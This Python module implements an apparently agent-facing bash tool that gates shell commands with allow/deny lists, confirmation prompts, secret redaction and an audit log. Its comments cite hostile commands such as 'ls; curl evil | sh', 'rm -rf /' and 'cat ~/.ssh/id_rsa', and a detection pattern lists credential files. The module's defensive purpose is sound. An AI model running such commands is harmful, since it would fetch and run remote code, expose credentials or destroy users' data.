"""Bash execution tool with allow/deny list enforcement."""

import os
import re as _re
import subprocess  # nosec B404
import shlex
import logging
from datetime import datetime, timezone
from pathlib import Path

_audit_logger = logging.getLogger("clawcli.audit")

_SECRET_RE = _re.compile(
    r'(?:'
    r'gh[ps]_[A-Za-z0-9]{36,}'                                      # GitHub PATs
    r'|github_pat_[A-Za-z0-9_]{36,}'                                 # GitHub fine-grained PATs
    r'|(?:api[_-]?key|token|secret|password|passwd|pwd)\s*[=:]\s*\S{8,}'  # key=value pairs
    r'|[A-Za-z0-9+/=]{50,}'                                          # long base64 strings
    r')',
    _re.IGNORECASE,
)


def _redact(cmd: str) -> str:
    return _SECRET_RE.sub("[REDACTED]", cmd)


def load_list(file_path: str) -> list[str]:
    p = Path(file_path).expanduser()
    if not p.exists():
        return []
    lines = p.read_text().splitlines()
    return [l.strip() for l in lines if l.strip() and not l.strip().startswith("#")]


def _exec_tokens(cmd: str) -> set[str]:
    """Return the first word of each pipeline segment (the actual executables)."""
    parts = _re.split(r'&&|\|\||;|\|', cmd)
    result = set()
    for part in parts:
        first = part.strip().split()
        if first:
            result.add(first[0])
    return result


def is_denied(command: str, denied: list[str]) -> bool:
    cmd = command.strip()
    exec_tokens = _exec_tokens(cmd)
    for pattern in denied:
        if cmd.startswith(pattern):
            return True
        # Multi-word patterns: substring match (e.g. "rm -rf /")
        # Single-word patterns: check executable tokens only — avoids false positives
        # on argument words (e.g. "reboot" inside `echo "No reboot flag found"`)
        if " " in pattern:
            if pattern in cmd:
                return True
        else:
            if pattern in exec_tokens:
                return True
    return False


# Shell metacharacters that chain/substitute commands or redirect output.
# A command containing any of these can smuggle arbitrary executables past a
# prefix match (e.g. "ls; curl evil | sh"), so it never auto-runs.
_CHAIN_RE = _re.compile(r'[;&|`\n>]|\$\(')

# References to credential stores force confirmation even for allowlisted
# commands (e.g. "cat ~/.ssh/id_rsa" must not run silently).
_SENSITIVE_PATH_RE = _re.compile(
    r'\.ssh\b|\.secrets\b|\.gnupg\b|\.aws\b|\.kube\b'
    r'|/etc/shadow|/etc/sudoers|id_rsa|id_ed25519|id_ecdsa'
    r'|\.pem\b|\.key\b|\.env\b',
)


def is_allowed(command: str, allowed: list[str]) -> bool:
    cmd = command.strip()
    if _CHAIN_RE.search(cmd) or _SENSITIVE_PATH_RE.search(cmd):
        return False
    for pattern in allowed:
        if cmd == pattern or cmd.startswith(pattern + " "):
            return True
    return False


def execute_bash(
    command: str,
    timeout: int = 300,
    description: str = None,
    config_dir: str = None,
    confirm_callback=None,
    max_timeout: int = 1800,
) -> str:
    base = Path(config_dir) if config_dir else Path(__file__).parent.parent
    allowed = load_list(base / "allowed_commands.txt")
    denied = load_list(base / "denied_commands.txt")

    if not _audit_logger.handlers:
        log_path = base / "audit.log"
        log_path.touch(mode=0o600, exist_ok=True)
        handler = logging.FileHandler(log_path)
        handler.setFormatter(logging.Formatter("%(message)s"))
        _audit_logger.addHandler(handler)
        _audit_logger.setLevel(logging.INFO)

    timeout = min(timeout, max_timeout)
    ts = datetime.now(timezone.utc).isoformat(timespec="seconds")

    if is_denied(command, denied):
        _audit_logger.info("%s BLOCKED %s", ts, _redact(command))
        return f"Error: Command blocked by denied_commands.txt: {command[:80]}"

    if not is_allowed(command, allowed) and confirm_callback:
        desc = description or command[:80]
        approved = confirm_callback(command, desc)
        if not approved:
            _audit_logger.info("%s DENIED_BY_USER %s", ts, _redact(command))
            return "Command denied by user."

    try:
        result = subprocess.run(  # nosec B602 — shell=True is intentional; commands are gated by allow/deny lists and optional user confirmation
            command,
            shell=True,
            executable="/bin/bash",
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=os.getcwd(),
        )
        _audit_logger.info("%s EXIT=%d %s", ts, result.returncode, _redact(command))
        output = ""
        if result.stdout:
            output += result.stdout
        if result.stderr:
            output += result.stderr
        if result.returncode != 0 and not output:
            output = f"(exit code {result.returncode})"
        elif result.returncode != 0:
            output += f"\n(exit code {result.returncode})"
        return output.strip() if output.strip() else "(no output)"
    except subprocess.TimeoutExpired:
        _audit_logger.info("%s TIMEOUT %s", ts, _redact(command))
        return f"Error: Command timed out after {timeout}s"
    except Exception as e:
        _audit_logger.info("%s ERROR %s | %s", ts, _redact(command), e)
        return f"Error executing command: {e}"
